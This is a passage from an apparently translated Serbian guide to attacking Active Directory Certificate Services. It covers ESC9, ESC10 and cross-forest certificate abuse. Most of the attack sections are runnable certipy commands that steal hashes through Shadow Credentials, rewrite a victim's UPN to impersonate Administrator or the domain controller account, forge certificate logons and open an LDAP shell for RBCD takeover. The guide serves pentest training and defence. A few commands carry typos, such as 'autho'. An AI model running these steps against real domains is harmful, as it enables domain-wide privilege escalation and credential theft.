certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Naknadno, `Jane`-ov `userPrincipalName` je izmenjen u `Administrator`, namerno izostavljajući deo domena `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova modifikacija ne krši ograničenja, s obzirom da `Administrator@corp.local` ostaje različit kao `userPrincipalName` `Administrator`-a.

Nakon toga, šablona za sertifikat `ESC9`, označena kao ranjiva, zahteva se kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zabeleženo je da `userPrincipalName` sertifikata odražava `Administratora`, bez ikakvog "object SID".

`Jane`-in `userPrincipalName` zatim se vraća na njen originalni, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentifikacije sa izdatim sertifikatom sada daje NT heš `Administrator@corp.local`. Komanda mora uključivati `-domain <domain>` zbog nedostatka specifikacije domena u sertifikatu:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Slabe mape sertifikata - ESC10

### Objasnjenje

Dve vrednosti ključa registra na kontroloru domena se odnose na ESC10:

* Podrazumevana vrednost za `CertificateMappingMethods` pod `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` je `0x18` (`0x8 | 0x10`), prethodno postavljena na `0x1F`.
* Podrazumevano podešavanje za `StrongCertificateBindingEnforcement` pod `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` je `1`, prethodno `0`.

**Slučaj 1**

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`.

**Slučaj 2**

Ako `CertificateMappingMethods` uključuje bit `UPN` (`0x4`).

### Zloupotreba slučaja 1

Sa konfigurisanim `StrongCertificateBindingEnforcement` kao `0`, nalog A sa dozvolama `GenericWrite` može biti iskorišćen da kompromituje bilo koji nalog B.

Na primer, imajući dozvole `GenericWrite` nad `Jane@corp.local`, napadač cilja da kompromituje `Administrator@corp.local`. Postupak je sličan ESC9, omogućavajući korišćenje bilo kog obrasca sertifikata.

Prvo se dobija `Jane`-ov heš korišćenjem Senki lozinki, iskorišćavajući `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Naknadno, `Jane`-ov `userPrincipalName` je promenjen u `Administrator`, namerno izostavljajući deo `@corp.local` kako bi se izbeglo kršenje ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga, zahteva se sertifikat koji omogućava autentikaciju klijenta kao `Jane`, koristeći podrazumevani `User` šablon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` zatim se vraća na originalnu vrednost `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autentifikacija sa dobijenim sertifikatom će rezultirati NT hešom `Administrator@corp.local`, zahtevajući specificiranje domena u komandi zbog odsustva detalja o domenu u sertifikatu.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Zloupotreba slučaja 2

Sa `CertificateMappingMethods` koji sadrži `UPN` bit flag (`0x4`), nalog A sa dozvolama `GenericWrite` može kompromitovati bilo koji nalog B koji nema svojstvo `userPrincipalName`, uključujući naloge mašina i ugrađenog administratorskog naloga domena `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počevši od dobijanja `Jane`-inog heša putem Senčenih akreditiva, iskorišćavajući `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` korisnika `Jane` zatim je postavljen na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Zahtevan je sertifikat za autentikaciju klijenta kao `Jane` koristeći podrazumevani `User` šablon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` vraća se na originalnu vrednost nakon ovog procesa.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Da biste se autentifikovali putem Schannel-a, koristi se Certipy-ova opcija `-ldap-shell`, koja ukazuje na uspeh autentifikacije kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande poput `set_rbcd` omogućavaju napade Resource-Based Constrained Delegation (RBCD), potencijalno kompromitujući kontroler domena.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na bilo koji korisnički nalog koji nema `userPrincipalName` ili gde se ne podudara sa `sAMAccountName`, pri čemu je podrazumevani `Administrator@corp.local` glavna meta zbog svojih povišenih LDAP privilegija i odsustva `userPrincipalName` podrazumevano.

## Kompromitovanje šuma pomoću sertifikata objašnjeno pasivnim glagolom

### Povreda poverenja šuma putem kompromitovanih CA

Konfiguracija za **prekograničnu registraciju** je relativno jednostavna. **Root CA sertifikat** iz resursnog šuma je **objavljen u šumovima naloga** od strane administratora, a **enterprise CA** sertifikati iz resursnog šuma su **dodati u `NTAuthCertificates` i AIA kontejnere u svakom šumu naloga**. Da pojasnimo, ovaj aranžman daje **CA u resursnom šumu potpunu kontrolu** nad svim ostalim šumovima za koje upravlja PKI. Ukoliko ovaj CA bude **kompromitovan od strane napadača**, sertifikati za sve korisnike u resursnom i šumovima naloga mogu biti **falsifikovani od strane njih**, čime se narušava sigurnosna granica šuma.

### Privilegije registracije dodeljene stranim principima

U okruženjima sa više šuma, oprez je potreban u vezi sa Enterprise CA koje **objavljuju šablone sertifikata** koji dozvoljavaju **Autentifikovanim korisnicima ili stranim principima** (korisnicima/grupama van šuma kojem Enterprise CA pripada) **prava registracije i izmene**.\
Prilikom autentifikacije preko poverenja, **SID Autentifikovanih korisnika** se dodaje u token korisnika od strane AD. Dakle, ako domen poseduje Enterprise CA sa šablonom koji **dozvoljava Autentifikovanim korisnicima prava registracije**, šablon bi potencijalno mogao biti **registrovan od strane korisnika iz drugog šuma**. Slično tome, ako **prava registracije eksplicitno budu dodeljena stranom principu putem šablona**, time se **stvara prekogranični odnos kontrole pristupa**, omogućavajući principu iz jednog šuma da **se upiše u šablon iz drugog šuma**.

Oba scenarija dovode do **povećanja površine napada** iz jednog šuma u drugi. Postavke šablona sertifikata mogu biti iskorišćene od strane napadača kako bi dobili dodatne privilegije u stranom domenu.
